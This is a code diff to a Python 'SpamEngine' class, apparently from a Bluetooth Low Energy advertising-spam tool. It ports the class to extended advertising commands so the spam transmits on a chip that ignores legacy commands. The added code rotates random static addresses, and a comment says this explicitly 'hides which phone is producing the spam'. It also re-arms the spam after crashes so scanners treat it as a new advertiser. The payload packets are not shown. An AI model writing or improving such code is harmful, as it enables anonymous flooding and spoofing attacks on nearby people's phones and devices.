@@ -40,8 +40,9 @@ import threading
 import time
 
 from .hci import (
-    ADV_TYPE_SCAN_IND,
+    EXT_ADV_PROPS_NONCONN_IND,
     HCI_STATUS_COMMAND_DISALLOWED,
+    OWN_ADDR_RANDOM,
     HciDevice,
     HciError,
     HciHardwareError,
@@ -155,26 +156,58 @@ class SpamEngine:
             hci.reset(retries=5, delay=0.5)
 
             # Belt and suspenders: kill any advertising that a previous
-            # session left running (BlueDucky, an earlier crash, etc).
-            # Ignoring COMMAND_DISALLOWED here means "already off".
+            # session left running (BlueDucky, an earlier crash, etc)
+            # and blow away every advertising set the controller still
+            # holds. Ignoring errors here means "already off" / "no sets".
             try:
-                hci.set_advertise_enable(False)
+                hci.set_extended_advertise_enable(False)
+            except HciError:
+                pass
+            try:
+                hci.clear_advertising_sets()
             except HciError:
                 pass
 
-            hci.set_advertising_parameters(
-                interval_min=interval_to_hci_units(interval_ms),
-                interval_max=interval_to_hci_units(interval_ms),
-                adv_type=ADV_TYPE_SCAN_IND,
+            # Extended Advertising path. The QCA WCN6750 on SM6375
+            # returns Status: Success to Legacy Advertising commands
+            # (0x2006/0x2008/0x2009/0x200A) but the radio never keys on
+            # air -- this was silent for months until we compared btmon
+            # output against `hciconfig hciX leadv` (also returns 0x12).
+            # Extended (0x2035..0x2039) is the only path the firmware
+            # actually honours.  We emit *legacy-shaped* PDUs
+            # (adv_event_props = LEGACY | SCANNABLE) so every classic
+            # BLE scanner still sees us.
+            #
+            # Order matters: the set must be created with Set Extended
+            # Advertising Parameters *before* we can bind a random
+            # address to it, otherwise the controller returns
+            # 0x42 "Advertising Set Not Found".  Same reason we cannot
+            # set data or enable until the set exists.
+            hci.set_extended_advertising_parameters(
+                handle=0,
+                adv_event_props=EXT_ADV_PROPS_NONCONN_IND,
+                prim_interval_min=interval_to_hci_units(interval_ms),
+                prim_interval_max=interval_to_hci_units(interval_ms),
+                own_addr_type=OWN_ADDR_RANDOM,
             )
+            # A random static address is used instead of the controller's
+            # public BD_ADDR because (a) rotating it hides which phone
+            # is producing the spam and (b) some scanners silently drop
+            # advertisements from public addresses whose OUI they cannot
+            # resolve.  We randomize the low 5 bytes and set the top two
+            # bits of the MSB to `11` per Bluetooth Core spec Vol 6 Part B
+            # §1.3.2.1 (Random Static Address).
+            rand_addr = bytes([0xC0 | (random.randint(0, 0x3F))]) + \
+                        bytes(random.randint(0, 255) for _ in range(5))
+            hci.set_advertising_set_random_address(0, rand_addr)
             # Load the first payload before enabling so the very first
             # advertising interval carries something the target can act
             # on, not the empty default.
             first = packets[0] if mode != MODE_RANDOM else random.choice(packets)
             first_adv, first_scan = first.render(tx_byte)
-            hci.set_advertising_data(first_adv)
-            hci.set_scan_response_data(first_scan or b"")
-            hci.set_advertise_enable(True)
+            hci.set_extended_advertising_data(first_adv)
+            hci.set_extended_scan_response_data(first_scan or b"")
+            hci.set_extended_advertise_enable(True)
             self.on_state("advertising")
 
             idx = 0
@@ -211,11 +244,11 @@ class SpamEngine:
                 # it faster than the firmware can drain the internal
                 # LE buffer.
                 try:
-                    hci.set_advertising_data(adv)
+                    hci.set_extended_advertising_data(adv)
                     if scan is not None:
-                        hci.set_scan_response_data(scan)
+                        hci.set_extended_scan_response_data(scan)
                     else:
-                        hci.set_scan_response_data(b"")
+                        hci.set_extended_scan_response_data(b"")
                     cmd_disallowed_streak = 0
                 except HciHardwareError as exc:
                     # This is the chip screaming that it wedged. There
@@ -271,7 +304,7 @@ class SpamEngine:
 
             self.on_state("stopping")
             try:
-                hci.set_advertise_enable(False)
+                hci.set_extended_advertise_enable(False)
             except HciError:
                 pass
         except HciError as exc:
@@ -281,7 +314,7 @@ class SpamEngine:
         finally:
             if hci is not None:
                 try:
-                    hci.set_advertise_enable(False)
+                    hci.set_extended_advertise_enable(False)
                 except Exception:
                     pass
                 hci.close()
@@ -314,14 +347,28 @@ class SpamEngine:
             hci.open()
             hci.reset(retries=5, delay=0.5)
             try:
-                hci.set_advertise_enable(False)
+                hci.set_extended_advertise_enable(False)
             except HciError:
                 pass
-            hci.set_advertising_parameters(
-                interval_min=interval_to_hci_units(interval_ms),
-                interval_max=interval_to_hci_units(interval_ms),
-                adv_type=ADV_TYPE_SCAN_IND,
+            try:
+                hci.clear_advertising_sets()
+            except HciError:
+                pass
+            # Re-arm the Extended set with a fresh random address so
+            # scanners see the recovery as a new advertiser and don't
+            # dedupe against pre-crash cached entries.  Params must be
+            # sent first (creates the set); binding the random address
+            # after (otherwise returns 0x42).
+            hci.set_extended_advertising_parameters(
+                handle=0,
+                adv_event_props=EXT_ADV_PROPS_NONCONN_IND,
+                prim_interval_min=interval_to_hci_units(interval_ms),
+                prim_interval_max=interval_to_hci_units(interval_ms),
+                own_addr_type=OWN_ADDR_RANDOM,
             )
+            rand_addr = bytes([0xC0 | (random.randint(0, 0x3F))]) + \
+                        bytes(random.randint(0, 255) for _ in range(5))
+            hci.set_advertising_set_random_address(0, rand_addr)
             return True
         except Exception:
             return False
